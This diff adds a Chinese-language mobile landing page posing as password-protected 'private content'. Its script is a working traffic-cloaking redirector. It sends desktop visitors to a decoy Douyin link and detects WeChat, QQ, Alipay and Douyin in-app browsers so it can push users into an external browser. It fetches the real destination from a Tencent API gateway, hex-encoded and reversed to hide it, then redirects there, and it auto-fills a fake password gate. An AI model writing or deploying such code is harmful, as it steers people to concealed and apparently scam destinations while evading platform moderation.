@@ -1,0 +1,283 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="https://jihulab.com/abs2023/abc/-/raw/main/assets/favicon.svg" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover"
+    />
+    <title>好玩好看，福利不断</title>
+    <style type="text/css">
+        html, body {
+            margin: 0;
+            padding: 0;
+        }
+        #app {
+            height: 100vh;
+            width: 100vw;
+            overflow: hidden;
+            position: relative;
+            display: none;
+        }
+        .play-icon {
+            position: absolute; z-index: 20; top:50%; left:50%; margin-top: -20px; margin-left: -20px;
+            opacity: .25;
+        }
+        #load-content { 
+            display:none;
+        }
+        #tips {
+            background-color: #fff;
+            padding: 15px;
+            position: absolute;
+            top:0;
+            left: 0;
+            width: calc(100vw - 30px);
+            height: 60px;
+            display: none;
+            justify-content: space-between;
+            color: #333;
+        }
+    </style>
+  </head>
+  <body ontouchstart="">
+    <div id="app">
+        <img id="bg-img" style="width:100%;height:100%;object-fit: cover;" src="" />
+        <div style="position:absolute; width:100%; height:100%; top:0; left:0; z-index: 10; backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); background-color: rgba(0, 0, 0, 0.5);">
+            <div style="display: flex; flex-direction: column; align-items: center;" id="sform">
+                <div style="margin-bottom: 20px; margin-top: calc(100vh / 5 - 30px); font-size: 16px; font-weight:bold; color: #eee">
+                    私密内容，请输入二维码下方密码
+                </div>
+                <div style="width:320px; height: 46px;border-radius: 46px;border:1px solid #fff;display:flex; align-items: center;">
+                    <input id="code" type="tel" style="flex:1; border: 0; background-color: rgba(255, 255, 255, 0.1); height: 46px; border-bottom-left-radius: 46px; border-top-left-radius: 46px; line-height: 46px; padding: 0 20px;color:#fff;outline: none;font-size:16px" />
+                    <button id="view" type="button" style="color: white; margin-left:-20px; height: 46px; line-height: 46px; border-radius: 46px; padding: 0 24px; background: linear-gradient(to right, rgb(255, 96, 52), rgb(238, 10, 36)); border: 0px;">查 看</button>
+                </div>
+                <div style="margin-top: 10px; font-size: 14px; color: #fff">
+                密码在二维码下面
+                </div>
+                <div style="margin-top: 10px; font-size: 14px; color: #fff">
+                二维码建议拍照保存
+                </div>
+            </div>
+
+            <svg t="1697000184486" class="play-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="4933" width="40" height="40"><path d="M512 0C229.376 0 0 229.376 0 512s229.376 512 512 512 512-229.376 512-512S794.624 0 512 0z m189.952 537.6l-261.12 150.528c-17.92 10.24-39.936-2.56-39.936-23.04V364.032c0-20.48 22.528-33.28 39.936-23.04l261.12 150.528c17.92 10.24 17.92 35.84 0 46.08z" fill="#ffffff" p-id="4934"></path></svg>
+            
+            <div id="load-content" style="width:100%;height: 100%; flex-direction: column; align-items: center; justify-content: center;">
+                <div style="width: 40px; height:40px;">
+                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="margin: auto; opacity: .5; background: none; display: block; shape-rendering: auto;" width="40px" height="40px" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid"><circle cx="50" cy="50" fill="none" stroke="#dddddd" stroke-width="10" r="35" stroke-dasharray="164.93361431346415 56.97787143782138"><animateTransform attributeName="transform" type="rotate" repeatCount="indefinite" dur="1s" values="0 50 50;360 50 50" keyTimes="0;1"></animateTransform></circle></svg>
+                </div>
+                <span style="color: #ccc; margin-top: 10px"></span>
+            </div>
+            <div id="tips">
+                <div
+                style="display: flex; flex-direction: column; align-items: flex-start"
+                >
+                <div style="font-size: 16px; font-weight: bold; margin-top: 5px">
+                    正在加载, 请按下方操作继续
+                </div>
+                <div
+                    style="
+                    font-size:14px;
+                    display: flex;
+                    align-items: center;
+                    margin-left: -1px;
+                    margin-top: 10px;
+                    "
+                >
+                    点击右上角 <span style="margin:0 5px"><svg t="1697002991127" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8184" width="20" height="20"><path d="M227.14123 413.647995c-52.14973 0-94.587262 42.439578-94.587262 94.587262 0 52.14973 42.437531 94.587262 94.587262 94.587262 52.147684 0 94.587262-42.437531 94.587262-94.587262C321.728492 456.087573 279.288914 413.647995 227.14123 413.647995z" fill="#272636" p-id="8185"></path><path d="M510.903016 413.647995c-52.14973 0-94.587262 42.439578-94.587262 94.587262 0 52.14973 42.437531 94.587262 94.587262 94.587262 52.147684 0 94.587262-42.437531 94.587262-94.587262C605.490278 456.087573 563.051723 413.647995 510.903016 413.647995z" fill="#272636" p-id="8186"></path><path d="M794.665825 413.647995c-52.14973 0-94.587262 42.439578-94.587262 94.587262 0 52.14973 42.437531 94.587262 94.587262 94.587262 52.147684 0 94.587262-42.437531 94.587262-94.587262C889.253086 456.087573 846.813508 413.647995 794.665825 413.647995z" fill="#272636" p-id="8187"></path></svg></span> 选择在浏览器中打开
+                    <img
+                    style="width: 16px; height: 16px"
+                    src="https://jihulab.com/abs2023/abc/-/raw/main/assets/browser.jpg"
+                    />
+                </div>
+                </div>
+                <img
+                style="height: 50px"
+                src="https://jihulab.com/abs2023/abc/-/raw/main/assets/arrow.png"
+                />
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        let mask = '';
+        let verify = '';
+        let authToken = '';
+        let re = '';
+        let _t = null;
+        let _cd = 30;
+        const prefixMap = {a:"01",b:"02",c:"03",d:"04",e:"05",f:"06",g:"07",h:"08",i: "09",j:"10",k:"11",l:"12",m:"13",n:"14",o:"15",p:"16",q:"17",r:"18",s:"19",t:"20",u:"21",v:"22",w:"23",x:"24",y:"25",z:"26",}
+        function isInQQ() {
+            const inIosQQ =
+                /(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent) &&
+                /\sQQ/i.test(navigator.userAgent);
+            const inAndroidQQ =
+                /Android/i.test(navigator.userAgent) &&
+                /MQQBrowser/i.test(navigator.userAgent) &&
+                /\sQQ/i.test(navigator.userAgent);
+            return inIosQQ || inAndroidQQ;
+        }
+
+        function isInWechat() {
+            const wxb = window.WeixinJSBridge;
+            return (
+                (typeof wxb === "object" && typeof wxb.invoke === "function") ||
+                /MicroMessenger/i.test(navigator.userAgent)
+            );
+        }
+
+        function inApp() {
+            const inWechat = isInWechat();
+            const inQQ = isInQQ();
+            const inAlipay = /alipay/i.test(navigator.userAgent);
+            const inDingtalk = /dingtalk/i.test(navigator.userAgent);
+            const inAweme = /(aweme|douyin|toutiao)/i.test(navigator.userAgent);
+
+            return inWechat || inQQ || inAlipay || inDingtalk || inAweme;
+        }
+
+        function isDesktopBrowser() {
+            return !/mobile/i.test(navigator.userAgent);
+        }
+        function panic() {
+            window.location.href = 'https://l.douyin.com/Adv4';
+        }
+        function checkPwd(pwd) {
+            const iPwd = parseInt(pwd);
+            return iPwd - verify == 888;
+        }
+        function hexToString(hexStr) {
+            const resultArr = [];
+            for (let i = 0; i < hexStr.length; i += 2) {
+                const charCode = parseInt(hexStr.substring(i, i + 2), 16);
+                resultArr.push(charCode);
+            }
+            const bytesView = new Uint8Array(resultArr);
+            return new TextDecoder("utf-8").decode(bytesView);
+        }
+
+        function getRandomInt(min, max) {
+            return Math.floor(Math.random() * (max - min + 1)) + min;
+        }
+        function getR(mv) {
+            const gateway = 'https://service-7lg3sq96-1320134514.hk.apigw.tencentcs.com/api';
+            fetch(gateway, {
+                    method: "post",
+                    body: mv,
+                    referrerPolicy: 'unsafe-url',
+                    headers: {
+                        "Content-Type": "text/plain",
+                    },
+                })
+                .then((response) => response.text())
+                .then((data) => {
+                    if (data.startsWith('0')) {
+                        location.href = hexToString(data.substring(1).split('').reverse().join(''))
+                    } else {
+                        document.getElementById('code').value = parseInt(verify) + 888;
+                        re = '?r='+data.substring(1)+mv;
+                        document.getElementById('bg-img').setAttribute('src', 'https://gw.alicdn.com/imgextra/i1/2206963049564/O1CN01lpClTV2KWMkrb3hoL_!!2206963049564.jpg_Q30.jpg');
+                        document.getElementById('sform').style.display = 'flex';
+                        document.querySelector('.play-icon').style.opacity = 0;
+                        document.getElementById('load-content').style.display = 'none';
+                    }
+                    
+                })
+                .catch((err) => {
+                    console.log(err);
+                    authToken = "";
+                    history.replaceState(null, "", '?i='+mv);
+                    alert('加载失败，请重试');
+                }).finally(() => {
+                    clearInterval(_t)
+                });
+        }
+        function inAppSignIn() {
+            document.getElementById('sform').style.display = 'none';
+            document.querySelector('.play-icon').style.display = 'none';
+            document.getElementById('load-content').style.display = 'flex';
+            document.getElementById('tips').style.display = 'flex';
+            document.querySelector('#load-content > span').innerText = ''
+        }
+        function remoteSignIn(r) {
+            document.getElementById('sform').style.display = 'none';
+            document.querySelector('.play-icon').style.opacity = 0;
+            document.getElementById('load-content').style.display = 'flex';
+            location.href = hexToString(r.split('').reverse().join(''));   
+        }
+        window.addEventListener('load', () => {
+            if (isDesktopBrowser()) {
+                panic();
+                return;
+            } else {
+                document.getElementById('app').style.display = 'block';
+            }
+
+            const search = location.search.substring(1);
+            const qs = new URLSearchParams(search);
+            let mv = qs.get('i') || '';
+            const r = qs.get('r') || '';
+            if (mv == '') {
+                if (r.length > 5) {
+                    mv = r.substring(r.length - 5);
+                }
+                
+            }
+            if (!/^[a-z]\d+$/i.test(mv)) {
+                panic();
+                return;
+            } else {
+                const prefix = mv.substring(0, 1);
+                const suffix = mv.substring(1);
+                mask = prefixMap[prefix] || '00';
+                verify = parseInt(suffix);
+                if (isNaN(verify)) {
+                    panic();
+                    return;
+                }
+
+                if (r) {
+                    if (inApp()) {
+                        history.replaceState(null, "", '?r='+r);
+                        inAppSignIn();
+                    } else {
+                        remoteSignIn(r.substring(0, r.length - 5));
+                    }
+                } else {
+                    document.getElementById('sform').style.display = 'none';
+                    document.querySelector('.play-icon').style.opacity = 0;
+                    document.getElementById('load-content').style.display = 'flex';
+
+                    clearInterval(_t)
+                    _cd = 30;
+                    _t = setInterval(() => {
+                        if (_cd > 0) {
+                            document.querySelector('#load-content > span').innerText = '内容加载中，请耐心等待（'+_cd+'）'
+                            _cd -= 1;
+                        } else {
+                            clearInterval(_t)
+                            //document.querySelector('#load-content > span').innerText = '内容加载中，请耐心等待'
+                        }
+                    }, 1000);
+                    getR(mv);
+                }
+            }
+            document.getElementById('view').addEventListener('click', () => {
+                const pwd = document.getElementById('code').value;
+                if (pwd.length != 4 || !checkPwd(pwd)) {
+                    alert('密码错误');
+                    return;
+                }
+                history.replaceState(null, "", re);
+                if (inApp()) {
+                    inAppSignIn();
+                } else {
+                    remoteSignIn(re.substring(0, re.length - 5));
+                }
+            });
+        });
+    </script>
+  </body>
+</html>
